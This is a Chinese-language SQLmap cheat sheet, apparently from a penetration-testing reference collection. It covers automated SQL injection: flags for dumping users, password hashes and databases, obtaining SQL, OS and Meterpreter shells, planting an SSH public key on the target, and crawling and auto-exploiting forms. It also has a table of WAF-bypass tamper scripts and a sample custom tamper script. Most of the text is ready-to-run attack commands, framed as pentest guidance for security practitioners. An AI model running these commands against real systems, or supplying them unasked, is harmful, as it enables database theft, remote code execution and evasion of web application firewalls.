# SQLmap

> SQLmap 是一个强大的工具，可以自动检测和利用 SQL 注入漏洞，相比手动测试节省时间和精力。它支持多种数据库和注入技术，使其在各种场景中灵活且有效。
> 此外，SQLmap 可以检索数据、操作数据库，甚至执行命令，为渗透测试人员和安全分析师提供了一套强大的功能。
> 不需要重新发明轮子，因为 SQLmap 已经经过专家的严格开发、测试和改进。使用可靠的、社区支持的工具意味着你可以受益于已建立的最佳实践，并避免因遗漏漏洞或在自定义代码中引入错误而带来的高风险。
> 然而，你应该始终了解 SQLmap 的工作原理，并在必要时能够手动重现其功能。

## 概述

* [SQLmap 的基本参数](#basic-arguments-for-sqlmap)
* [加载请求文件](#load-a-request-file)
* [自定义注入点](#custom-injection-point)
* [二次注入](#second-order-injection)
* [获取 shell](#getting-a-shell)
* [爬取并自动利用](#crawl-and-auto-exploit)
* [SQLmap 的代理配置](#proxy-configuration-for-sqlmap)
* [注入篡改](#injection-tampering)
    * [后缀和前缀](#suffix-and-prefix)
    * [默认的篡改脚本](#default-tamper-scripts)
    * [自定义篡改脚本](#custom-tamper-scripts)
    * [自定义 SQL 负载](#custom-sql-payload)
    * [评估 Python 代码](#evaluate-python-code)
    * [预处理和后处理脚本](#preprocess-and-postprocess-scripts)
* [减少请求数量](#reduce-requests-number)
* [没有 SQL 注入的 SQLmap](#sqlmap-without-sql-injection)
* [参考文献](#references)

## SQLmap 的基本参数

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## 加载请求文件

SQLmap 中的请求文件是一个保存的 HTTP 请求，SQLmap 读取并使用该请求来执行 SQL 注入测试。此文件允许你提供一个完整的自定义 HTTP 请求，SQLmap 可以用它来针对更复杂的应用程序进行测试。

```powershell
sqlmap -r request.txt
```

## 自定义注入点

SQLmap 中的自定义注入点允许你指定 SQLmap 应该在哪里以及如何尝试将负载注入到请求中。这在处理 SQLmap 无法自动检测到的更复杂或非标准的注入场景时非常有用。

通过使用通配符字符 '`*`' 定义自定义注入点，你可以对测试过程有更精细的控制，确保 SQLmap 针对你怀疑易受攻击的部分进行测试。

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

## 二次注入

二次 SQL 注入发生在恶意 SQL 代码被注入应用程序但不立即执行，而是存储在数据库中并在另一个 SQL 查询中使用时。

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## 获取 shell

* SQL Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* OS Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-shell
    ```

* Meterpreter:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* SSH Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```

## 爬取并自动利用

这种方法不建议用于渗透测试；它应该仅在受控环境或挑战中使用。它会爬取整个网站并自动提交表单，这可能导致意外的请求发送到敏感功能，如“删除”或“销毁”端点。

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = 非交互模式，通常 SQLmap 会询问问题，此选项接受默认答案
* `--crawl` = 你想爬取站点的深度
* `--forms` = 解析并测试表单

## SQLmap 的代理配置

要使用代理运行 SQLmap，可以使用 `--proxy` 选项后跟代理 URL。SQLmap 支持多种类型的代理，如 HTTP、HTTPS、SOCKS4 和 SOCKS5。

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP 代理:

    ```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
    ```

* SOCKS 代理:

    ```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
    ```

* SOCKS5 代理:

    ```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
    ```

## 注入篡改

在 SQLmap 中，篡改可以帮助你调整注入方式以绕过 Web 应用防火墙（WAF）或其他自定义的清理机制。SQLmap 提供了多种选项和技术来篡改用于 SQL 注入的负载。

### 后缀和前缀

`--suffix` 和 `--prefix` 选项允许你指定应附加或前置到 SQLMap 生成的负载的额外字符串。这些选项在目标应用程序需要特定格式时非常有用，或者当你需要绕过某些过滤器或保护措施时。

```powershell
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: `--suffix` 选项会在每个由 SQLMap 生成的负载末尾附加指定的字符串。
* `--prefix=PREFIX`: `--prefix` 选项会在每个由 SQLMap 生成的负载开头前置指定的字符串。

### 默认的篡改脚本

篡改脚本是一种修改 SQL 注入负载以绕过 WAF 或其他安全机制的脚本。SQLmap 带有许多预构建的篡改脚本，可以用来自动调整负载。

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

以下表格突出显示了一些最常用的篡改脚本：

| 篡改脚本 | 描述 |
| --- | --- |
| 0x2char.py | 将每个（MySQL）0xHEX 编码字符串替换为其等效的 CONCAT(CHAR(),...) 对应物 |
| apostrophemask.py | 将单引号字符替换为其 UTF-8 全角对应物 |
| apostrophenullencode.py | 将单引号字符替换为其非法的双 Unicode 对应物 |
| appendnullbyte.py | 在负载末尾附加编码的 NULL 字节字符 |
| base64encode.py | 使用 Base64 对给定负载中的所有字符进行编码 |
| between.py | 将大于运算符（'>'）替换为 'NOT BETWEEN 0 AND #' |
| bluecoat.py | 在 SQL 语句后的空格字符后替换为有效的随机空白字符。之后将字符 '=' 替换为 LIKE 运算符 |
| chardoubleencode.py | 双重 URL 编码给定负载中的所有字符（不对已编码的字符进行处理） |
| charencode.py | URL 编码给定负载中的所有字符（不对已编码的字符进行处理）（例如 SELECT -> %53%45%4C%45%43%54） |
| charunicodeencode.py | Unicode-URL 编码给定负载中的所有字符（不对已编码的字符进行处理）（例如 SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054） |
| charunicodeescape.py | Unicode 转义给定负载中的未编码字符（不对已编码的字符进行处理）（例如 SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054） |
| commalesslimit.py | 将类似 'LIMIT M, N' 的实例替换为 'LIMIT N OFFSET M' |
| commalessmid.py | 将类似 'MID(A, B, C)' 的实例替换为 'MID(A FROM B FOR C)' |
| commentbeforeparentheses.py | 在括号前添加（内联）注释（例如 ( -> /**/() |
| concat2concatws.py | 将类似 'CONCAT(A, B)' 的实例替换为 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' |
| charencode.py | URL 编码给定负载中的所有字符（不对已编码的字符进行处理） |
| charunicodeencode.py | Unicode-URL 编码给定负载中的非编码字符（不对已编码的字符进行处理） |
| equaltolike.py | 将所有等于运算符（'='）的实例替换为 'LIKE' 运算符 |
| escapequotes.py | 转义引号（' 和 "） |
| greatest.py | 将大于运算符（'>'）替换为 'GREATEST' 对应物 |
| halfversionedmorekeywords.py | 在每个关键字前添加版本化的 MySQL 注释 |
| htmlencode.py | HTML 编码（使用代码点）所有非字母数字字符（例如 ' -> &#39;） |
| ifnull2casewhenisnull.py | 将类似 'IFNULL(A, B)' 的实例替换为 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' 对应物 |
| ifnull2ifisnull.py | 将类似 'IFNULL(A, B)' 的实例替换为 'IF(ISNULL(A), B, A)' |
| informationschemacomment.py | 在所有（MySQL）"information_schema" 标识符的末尾添加内联注释（/**/） |
| least.py | 将大于运算符（'>'）替换为 'LEAST' 对应物 |
| lowercase.py | 将每个关键字字符替换为其小写值（例如 SELECT -> select） |
| modsecurityversioned.py | 将完整查询括在版本化的注释中 |
| modsecurityzeroversioned.py | 将完整查询括在零版本化的注释中 |
| multiplespaces.py | 在 SQL 关键字周围添加多个空格 |
| nonrecursivereplacement.py | 将预定义的 SQL 关键字替换为适合替换的形式（例如 .replace("SELECT", "") 过滤器） |
| overlongutf8.py | 将给定负载中的所有字符转换（不对已编码的字符进行处理） |
| overlongutf8more.py | 将给定负载中的所有字符转换为过长的 UTF-8（不对已编码的字符进行处理）（例如 SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94） |
| percentage.py | 在每个字符前添加百分号（'%'） |
| plus2concat.py | 将加法运算符（'+'）替换为（MsSQL）函数 CONCAT() 对应物 |
| plus2fnconcat.py | 将加法运算符（'+'）替换为（MsSQL）ODBC 函数 {fn CONCAT()} 对应物 |
| randomcase.py | 将每个关键字字符替换为其随机大小写值 |
| randomcomments.py | 向 SQL 关键字添加随机注释 |
| securesphere.py | 追加特殊制作的字符串 |
| sp_password.py | 在负载末尾附加 'sp_password' 以自动混淆来自 DBMS 日志的信息 |
| space2comment.py | 将空格字符（' '）替换为注释 |
| space2dash.py | 将空格字符（' '）替换为破折号注释（'--'）后跟随机字符串和新行（'\n'） |
| space2hash.py | 将空格字符（' '）替换为井号（'#'）后跟随机字符串和新行（'\n'） |
| space2morehash.py | 将空格字符（' '）替换为井号（'#'）后跟随机字符串和新行（'\n'） |
| space2mssqlblank.py | 将空格字符（' '）替换为有效替代字符集中的随机空白字符 |
| space2mssqlhash.py | 将空格字符（' '）替换为井号（'#'）后跟新行（'\n'） |
| space2mysqlblank.py | 将空格字符（' '）替换为有效替代字符集中的随机空白字符 |
| space2mysqldash.py | 将空格字符（' '）替换为破折号注释（'--'）后跟新行（'\n'） |
| space2plus.py | 将空格字符（' '）替换为加号（'+'） |
| space2randomblank.py | 将空格字符（' '）替换为有效替代字符集中的随机空白字符 |
| symboliclogical.py | 将逻辑运算符 AND 和 OR 替换为其符号对应物（&& 和 ||） |
| unionalltounion.py | 将 UNION ALL SELECT 替换为 UNION SELECT |
| unmagicquotes.py | 将引号字符（'）替换为多字节组合 %bf%27 并在末尾附加通用注释（以使其生效） |
| uppercase.py | 将每个关键字字符替换为其大写值 'INSERT' |
| varnish.py | 追加 HTTP 头部 'X-originating-IP' |
| versionedkeywords.py | 将每个非函数关键字括在版本化的 MySQL 注释中 |
| versionedmorekeywords.py | 将每个关键字括在版本化的 MySQL 注释中 |
| xforwardedfor.py | 追加伪造的 HTTP 头部 'X-Forwarded-For' |

### 自定义篡改脚本

创建自定义篡改脚本时，有一些事项需要注意。脚本架构包含这些必填变量和函数：

* `__priority__`: 定义篡改脚本应用的顺序。这决定了 SQLmap 应该在篡改管道中多早或多晚应用你的篡改脚本。正常优先级是 0，最高是 100。
* `dependencies()`: 在使用篡改脚本之前调用此函数。
* `tamper(payload)`: 主函数，修改负载。

以下代码是一个示例篡改脚本，将类似 '`LIMIT M, N`' 的实例替换为 '`LIMIT N OFFSET M`' 对应物：

```py
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

* 将其保存为类似 `mytamper.py` 的名称
* 放置在 SQLmap 的 `tamper/` 目录中，通常为：

    ```ps1
    /usr/share/sqlmap/tamper/
    ```

* 使用 SQLmap

    ```ps1
    sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
    ```

### 自定义 SQL 负载

SQLmap 中的 `--sql-query` 选项用于在 SQLmap 确认注入并收集必要访问权限后，在易受攻击的数据库上手动运行自己的 SQL 查询。

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### 评估 Python 代码

`--eval` 选项允许你使用 Python 定义或修改请求参数。然后可以在 URL、头部、Cookie 等中使用这些计算出的变量。

在以下场景中特别有用：

* **动态参数**: 当参数需要随机或按顺序生成时。
* **令牌生成**: 处理 CSRF 令牌或动态身份验证头。
* **自定义逻辑**: 如编码、加密、时间戳等。

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

### 预处理和后处理脚本

```ps1
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

#### 预处理脚本 (preprocess.py)

预处理脚本用于在发送到目标应用程序之前修改请求数据。这对于编码参数、添加头部或其他请求修改非常有用。

```ps1
--preprocess=preprocess.py    使用给定的脚本（请求）进行预处理
```

**示例 preprocess.py**:

```ps1
#!/usr/bin/env python
def preprocess(req):
    print("Preprocess")
    print(req)
```

#### 后处理脚本 (postprocess.py)

后处理脚本用于在从目标应用程序接收到响应数据后对其进行修改。这对于解码响应、提取特定数据或其他响应修改非常有用。

```ps1
--postprocess=postprocess.py  使用给定的脚本（响应）进行后处理
```

## 减少请求数量

当您想专注于特定类型的 SQL 注入技术和负载时，`--test-filter` 参数非常有用。与其测试 SQLMap 所有的负载范围，您可以限制为匹配特定模式的那些负载，使过程更加高效，尤其是在大型或缓慢的 Web 应用程序中。

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

默认情况下，SQLmap 以级别 1 和风险 1 运行，这会产生较少的请求。无目的地增加这些值可能会导致大量耗时且不必要的测试。

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

使用 `--technique` 选项指定要测试的 SQL 注入技术类型，而不是测试所有可能的技术。

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```

## 没有 SQL 注入的 SQLmap

即使没有利用 SQL 注入漏洞，使用 SQLmap 仍然可以在各种合法用途中非常有用，特别是在安全评估、数据库管理和应用程序测试方面。

您可以使用 SQLmap 通过其端口而非 URL 访问数据库。

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```

## 参考文献

* [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
* [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)